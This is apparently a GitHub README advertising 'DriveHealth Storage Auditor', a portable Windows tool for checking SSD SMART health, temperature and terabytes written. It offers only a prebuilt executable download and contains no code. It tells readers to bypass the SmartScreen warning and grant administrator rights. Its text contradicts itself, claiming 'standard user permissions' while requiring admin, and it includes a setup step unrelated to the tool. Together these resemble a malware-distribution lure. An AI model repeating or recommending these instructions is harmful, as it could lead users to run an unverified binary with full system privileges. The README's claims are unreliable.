<p align="center">
  <img src="https://i.postimg.cc/B6S9pjJg/banner.png" alt="DriveHealth Storage Auditor — Portable NVMe & SSD SMART Health, TBW & Temp Checker" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-NVMe%20%26%20SSD%20SMART%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-drivehealth--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# DriveHealth Storage Auditor — Portable NVMe & SSD SMART Health, TBW & Temp Checker

**Buying a used NVMe SSD or laptop, or suspecting a failing drive is causing game crashes and slow Windows boots? Inspect true SMART health percentage, total terabytes written (TBW), controller temperature, and media errors in a single portable executable.**

DriveHealth Storage Auditor reads native NVMe and SATA SMART attributes directly from Windows storage controllers: **presenting remaining life percentage, total host reads/writes in TB, power-on hours, unsafe shutdown counts, and thermal throttling warnings without installing background services**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) PC builders, laptop buyers, and gamers** checking internal NVMe/SATA SSDs and USB external drives.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Buying a used SSD or laptop and want to verify real usage | Seller claims 'barely used' without showing SMART power-on hours | Check exact Power-On Hours, Power Cycle Count, and Total TB Written |
| Sudden game stutters or disappearing secondary NVMe drive | NVMe controller overheating (`> 70°C`) or rising Media/Integrity Errors | Inspect real-time drive temperature and SMART error counters |
| Windows Disk Management only says 'Healthy' until drive dies | Basic Windows storage status hides 5% remaining flash wear | Read exact NVMe `Percentage Used` and `Available Spare` telemetry |
| Need a quick hardware report when selling a PC or SSD | Heavy benchmark suites require installation and clutter the system | Run portable `DriveHealth.exe` and export a clean SMART text summary |

## Download for Windows

[**Download DriveHealth.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/DriveHealth.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `DriveHealth.exe`? (Key features)

- Reads native **NVMe Health Information Log** and **SATA SMART** attributes across all internal and USB drives.
- Displays **Health Remaining %**, **Temperature (°C)**, **Total Host Writes (TBW)**, **Power-On Hours**, and **Media Errors**.
- Highlights thermal throttling risks (`> 65°C`) and critical `Available Spare` warnings in red.
- 100% portable single `.exe`—leaves zero background services or drivers behind after closing.

### Sample Output

```text
[DriveHealth] Querying Physical Storage Controllers (NVMe / SATA)...
[OK]   Drive 0 (NVMe)   : Samsung SSD 990 PRO 2TB | Health: 99% | Temp: 39°C
       Stats            : Host Writes: 18.4 TB | Power-On: 1,420 hrs | Media Errors: 0
[OK]   Drive 1 (NVMe)   : WD_BLACK SN850X 1TB     | Health: 97% | Temp: 42°C
       Stats            : Host Writes: 24.1 TB | Power-On: 2,110 hrs | Media Errors: 0
```

The release ZIP is named `DriveHealth.zip`; the Windows executable inside is named `DriveHealth.exe`.

1. Close DriveHealth before updating or replacing executable files.
2. Click **Download DriveHealth.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `DriveHealth.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit); Administrator privileges required to query raw NVMe/SMART controller IOCTLs.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `DriveHealth.exe` runs locally without uploading your files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Verifying used SSDs and laptops before purchase

Reveals whether a 'new' drive actually has 15,000 power-on hours or 300 TB written.

### Catching NVMe thermal throttling during long gaming sessions

Detects drives running above 70°C under GPU exhaust so you can add an M.2 heatsink.

### Early warning for failing game drives

Non-zero `Media and Data Integrity Errors` warn you to back up saves before complete failure.

### Zero background bloat

Queries hardware on demand and exits cleanly.

## Default folders and configuration paths

DriveHealth runs as a standalone portable executable with no required installation folders:

```text
Portable (Queries \\.\PhysicalDrive0..N directly)
```

Typical directory layout:

```text
DriveHealth.exe
├── PhysicalDrive0 (NVMe) -> Health % | Temp °C | TBW | Hours | Errors
├── PhysicalDrive1 (SATA) -> Reallocated Sectors | Pending Sectors | Hours
└── Export Report         -> DriveHealth_Report_2026-11-23.txt
```

Some inexpensive USB-to-NVMe enclosures block SMART passthrough commands; internal M.2/SATA slots always expose full SMART data.

## Quick start guide

Follow these steps to get started:

1. **Extract `DriveHealth.zip` and launch `DriveHealth.exe`.** Approve the UAC prompt so Windows allows raw storage IOCTL queries.
2. **Select each physical drive in the top dropdown.** Review Health %, Temperature, TBW, and Media Errors.
3. **Click **Refresh** during a heavy file transfer or game load to check peak temperature.** Ensure NVMe drives stay below `65–70°C`.
4. **Click **Export Report** if you want to save or share a SMART summary.** Keep a record of your drive health.

### Data safety note

DriveHealth opens physical drives strictly in read-only query mode (`IOCTL_STORAGE_QUERY_PROPERTY`).

## What the status summary shows

DriveHealth displays **drive model, firmware, interface, health %, temperature, TBW, power-on hours, and error counters**.

## FAQ

**Why does DriveHealth ask for Administrator permission?**

Windows requires administrator privileges to send raw NVMe/SMART query commands to `\\.\PhysicalDrive` devices.

**Does DriveHealth write data or benchmark-wear my SSD?**

No. It only reads existing SMART telemetry counters from the drive controller with zero disk writes.

**Does it work on both NVMe M.2 and SATA SSDs/HDDs?**

Yes—it supports NVMe, SATA SSD, and SATA HDD drives.

## Useful reading

- [Microsoft Docs — Working with NVMe Drives in Windows](https://learn.microsoft.com/en-us/windows/win32/fileio/working-with-nvme-devices)

## More Windows Desktop Utilities

- [SteamJunction-LibraryMover](../SteamJunction-LibraryMover) — Move Steam/Epic games between SSDs via NTFS Junctions
- [DupeSweep-HashFileCleaner](../DupeSweep-HashFileCleaner) — Fast SHA-256 duplicate photo, video & download cleaner
- [PadDrift-ControllerPollingTest](../PadDrift-ControllerPollingTest) — Gamepad stick drift & mouse polling rate (1000-8000 Hz) tester
- [Win11-GamingDebloatGuard](../Win11-GamingDebloatGuard) — Windows 11 gaming optimizer & background process cleaner

*Independent open-source desktop utility for Windows.*
